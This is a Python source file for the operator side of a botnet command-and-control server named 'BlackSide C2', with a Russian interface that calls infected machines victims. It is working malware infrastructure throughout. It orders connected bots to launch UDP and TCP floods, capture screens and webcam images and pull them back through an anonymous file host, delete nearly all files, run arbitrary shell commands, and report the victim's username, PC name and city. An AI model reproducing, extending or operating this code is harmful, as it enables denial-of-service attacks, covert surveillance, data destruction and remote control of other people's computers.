import threading, os, time, socket, sys
from colorama import Fore, init
from prettytable import PrettyTable
from anonfile import AnonFile
init()
server_ip = ""
if os.name == 'nt': 
    os.system('mode 88,24')
    os.system('title BlackSide C2')
else:
    sys.stdout.write("\x1b]2;BlackSide C2\x07")    
def cls():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def logo():
    print(f"{Fore.LIGHTWHITE_EX}\n\n\n\n\n\n\n\n                                   Black{Fore.LIGHTMAGENTA_EX}Side\n\n\n\n\n\n\n\n")


def connect(server, conns):
    try:
        while True:
            conn, addr = server.accept()
            conns.append(conn)
    except:
        time.sleep(0.5)
        print('[-] Ошибка! Попробуйте позже ')     

if __name__ == "__main__":
    cls()
    logo()
    server_port = 8080
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((server_ip, server_port))
    server.listen()
    conns = []
 
    threading.Thread(target=connect, args=(server, conns)).start()
    def cmds():
     while True:          
        command = input(f'{Fore.LIGHTWHITE_EX}{os.getlogin()}@BlackSide: ~#{Fore.LIGHTMAGENTA_EX} ') 
        try:
             for conn in conns:   
              conn.send(str.encode('check'))
        except:
             conns.remove(conn)   
        if command == 'help' or command == 'Help':
            helpcomm = PrettyTable(['Команда', 'Описание', 'Использование'])
            helpcomm.add_row(['UDP Flood', 'UDP флуд', 'Udpflood'])
            helpcomm.add_row(['TCP Flood', 'TCP флуд', 'Tcpflood'])
            helpcomm.add_row(['Screen', 'Скриншот экрана жертвы', 'Screen [Ip Жертвы/all]'])
            helpcomm.add_row(['Webcam', 'Скриншот с вебкамеры', 'Webcam [Ip Жертвы/all]'])
            helpcomm.add_row(['Delete All', 'Удаляет почти все файлы', 'Dall [Ip Жертвы/all]'])
            helpcomm.add_row(['Text To Speech', 'Преобразует текст в речь', 'Tts [Ip Жертвы/all]'])
            helpcomm.add_row(['Message Box', 'Отправляет сообщение на экран жертвы', 'Msgbox [Ip Жертвы/all]'])
            helpcomm.add_row(['Shell', 'Выполняет консольные команды', 'Shell [Ip Жертвы/all]'])
            helpcomm.add_row(['Cwd', 'Текущая директория', 'Cwd [Ip Жертвы]'])
            helpcomm.add_row(['Info', 'Информация о ПК', 'Info [Ip Жертвы]'])
            helpcomm.add_row(['Bots', 'Информация о подключенных девайсах', 'Bots'])
            helpcomm.add_row(['Clear', 'Очищает консоль', 'Clear'])
            print(helpcomm)
 
 
        elif command == 'Clear' or command == 'clear' or command == 'cls' or command == 'Cls':
            cls()
            logo()
        elif command.startswith('tts') or command.startswith('Tts'):
             iparg = command[4:]
             if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()         
             if iparg == 'all' or iparg == 'All':  
              for conn in conns:
                try:
                 conn.send(str.encode('tts'))    
                except Exception as e:
                    print(e) 
              ttstext = input('Сообщение: ')
              for conn in conns:
                try:
                    conn.send(str.encode(ttstext))
                except:
                    pass              
             else: 
                for conn in conns:
                    if conn.getpeername()[0] == iparg:
                      try:
                       conn.send(str.encode('tts'))    
                      except Exception as e:
                       print(e)
                ttstext = input('Сообщение: ')                          
                for conn in conns:
                     if conn.getpeername()[0] == iparg:   
                      try:
                        conn.send(str.encode(ttstext))
                      except Exception as e:
                          print(e)                               
             print('[+] Команда отправлена')   

        elif command.startswith('dall') or command.startswith('Dall'):
             iparg = command[5:]
             if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()         
             if iparg == 'all' or iparg == 'All':  
              for conn in conns:
                try:
                 conn.send(str.encode('dall'))    
                except Exception as e:
                    print(e)     
             else:
                for conn in conns:
                    if conn.getpeername()[0] == iparg:
                        try:
                            conn.send(str.encode("dall"))
                        except:
                            pass              
             print('[+] Команда отправлена')                    

        elif command.startswith('msgbox') or command.startswith('Msgbox'):
             iparg = command[7:]
             if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()         
             if iparg == 'all' or iparg == 'All':  
              for conn in conns:
                try:
                 conn.send(str.encode('msgbox'))    
                except Exception as e:
                    print(e)          
              title = input('Заголовок: ')
              message = input('Сообщение: ')      
              for conn in conns:
                conn.send(str.encode(title))
                conn.send(str.encode(message))
             else: 
                for conn in conns:
                    if conn.getpeername()[0] == iparg:
                      try:
                       conn.send(str.encode('msgbox'))    
                      except Exception as e:
                       print(e)
                title = input('Заголовок: ')
                message = input('Сообщение: ')                          
                for conn in conns:
                     if conn.getpeername()[0] == iparg:   
                      try:
                        conn.send(str.encode(title))
                        conn.send(str.encode(message))
                      except Exception as e:
                          print(e)    


        elif command == 'udpflood' or command == 'Udpflood':      
              for i in conns:
               try:    
                i.send(str.encode("udp"))
               except Exception as e:
                  conns.remove(i)
              thost = input('Айпи: ~# ')
              for i in conns:
               try:    
                 i.send(str.encode(thost))
               except Exception as e:
                 conns.remove(i)           
              tport = input('Порт: ~# ')
              for i in conns:
               try:    
                i.send(str.encode(tport))
               except Exception as e:
                  conns.remove(i)
              dur = input('Длительность: ~# ')
              for i in conns:
               try:    
                i.send(str.encode(dur))
               except Exception as e:
                  conns.remove(i)               
              print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTWHITE_EX}] Команда {Fore.LIGHTMAGENTA_EX}успешно{Fore.LIGHTWHITE_EX} отправлена') 

        elif command == 'tcpflood' or command == 'Tcpflood':        
              for i in conns:
               try:    
                i.send(str.encode("tcp"))
               except Exception as e:
                  conns.remove(i)
              thost = input('Айпи: ~# ')
              for i in conns:
               try:    
                 i.send(str.encode(thost))
               except Exception as e:
                 conns.remove(i)           
              tport = input('Порт: ~# ')
              for i in conns:
               try:    
                i.send(str.encode(tport))
               except Exception as e:
                  conns.remove(i)
              dur = input('Длительность: ~# ')
              for i in conns:
               try:    
                i.send(str.encode(dur))
               except Exception as e:
                  conns.remove(i)               
              print(f'{Fore.LIGHTWHITE_EX}[{Fore.LIGHTMAGENTA_EX}+{Fore.LIGHTWHITE_EX}] Команда {Fore.LIGHTMAGENTA_EX}успешно{Fore.LIGHTWHITE_EX} отправлена') 

        elif command.startswith('Webcam') or command.startswith('webcam'):
            iparg = command[7:]
            if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()    
            anon = AnonFile()     
            if iparg == 'all' or iparg == 'All':
                for conn in conns:
                    try:
                        conn.send(str.encode('webcam'))
                        link = str(conn.recv(4096), "utf-8")
                        time.sleep(0.5)
                        scr = anon.download(link, 'screenshots')
                        print(f'[+] Скриншот "{scr}" скачан')                        
                    except Exception as e:
                        print(f'[-] Ошибка: {e}') 
            else:
                for conn in conns:
                    if conn.getpeername()[0] == iparg:
                     try:   
                        conn.send(str.encode('webcam'))
                        link = str(conn.recv(4096), "utf-8")
                        time.sleep(0.5)
                        scr = anon.download(link, 'screenshots')
                        print(f'[+] Скриншот "{scr}" скачан')                        
                     except Exception as e:
                        print(f'[-] Ошибка: {e}')                                   


        elif command.startswith('info') or command.startswith('Info'):
            iparg = command[5:]
            if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()
            for conn in conns:    
             if conn.getpeername()[0] == iparg:
                    try:
                        conn.send(str.encode('info'))
                        print(str(conn.recv(4096), 'utf-8'))
                    except:
                        pass   

        

        elif command.startswith('Screen') or command.startswith('screen'):
            iparg = command[7:]
            if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()
            anon = AnonFile()
            if iparg == 'all' or iparg == 'All':
                for conn in conns:
                    try:
                     conn.send(str.encode('screen'))
                     link = str(conn.recv(4096), "utf-8")
                     time.sleep(0.5)
                     scr = anon.download(link, 'screenshots')
                     print(f'[+] Скриншот "{scr}" скачан')
                    except Exception as e:
                        print(f'[-] Ошибка: {e}')                     
            else:    
                for conn in conns:
                     if conn.getpeername()[0] == iparg:
                       try: 
                        conn.send(str.encode('screen'))
                        link = str(conn.recv(4096), "utf-8") 
                        time.sleep(0.3)
                        scr = anon.download(link, 'screenshots')
                        print(f'[+] Скриншот "{scr}" скачан')
                       except Exception as e:
                        print(f'[-] Ошибка: {e}')

        elif command.startswith('Shell') or command.startswith('shell'):
            iparg = command[6:]
            if int(len(iparg)) <= 2:
                print('[-] Укажите IP/All')
                return cmds()
            if iparg == 'all' or iparg == 'All':
                for conn in conns:
                    try:
                        conn.send(str.encode('shell'))
                    except Exception as e:
                        print(f'[-] Ошибка: {e}')
                shellcmd = input('Команда: ~# ') 
                for conn in conns:
                    try:
                         conn.send(str.encode(shellcmd))
                    except Exception as e:
                        print(e)      

                print('[+] Команда отправлена')         
            else:    
                shellcmd = input('Команда: ~# ') 
                for conn in conns:
                     if conn.getpeername()[0] == iparg:
                       try:    
                        conn.send(str.encode("shell"))         
                        conn.send(str.encode(shellcmd))    
                       except Exception as e: 
                        print(f'[-] Ошибка: {e}')    
                print('[+] Команда отправлена')  
          
   
        elif command.startswith('cwd') or command.startswith('cwd'):
            iparg = command[4:]
            if int(len(iparg)) < 3:
                print('[-] Укажите IP')
                return cmds()
            if conn.getpeername()[0] == iparg:
                for conn in conns:
                    try:
                        conn.send(str.encode('cwd'))
                        print(str(conn.recv(4096), 'utf-8'))
                    except:
                        pass   

        elif command == 'bots':
            try:
             botslist = PrettyTable([ 'Username','PC Name', 'City', 'IP'])
             for conn in conns:
                 try:
                  conn.send(str.encode("botsn"))   
                  usern = str(conn.recv(1024), 'utf-8')
                  pcname = str(conn.recv(1024), 'utf-8')
                  city = str(conn.recv(1024), 'utf-8')
                 except:
                     pass
                 ipaddr = str(conn.getpeername()[0])
                 botslist.add_row([ usern , pcname, city ,ipaddr ])
             print('Количество ботов: ' + str(len(conns)))
             print(botslist)                   
            except Exception as e:
                print(f'Вознилка ошибка: {e}')
        else:
            print('[-] Такой команды не существует, напишите "help"')
    cmds()
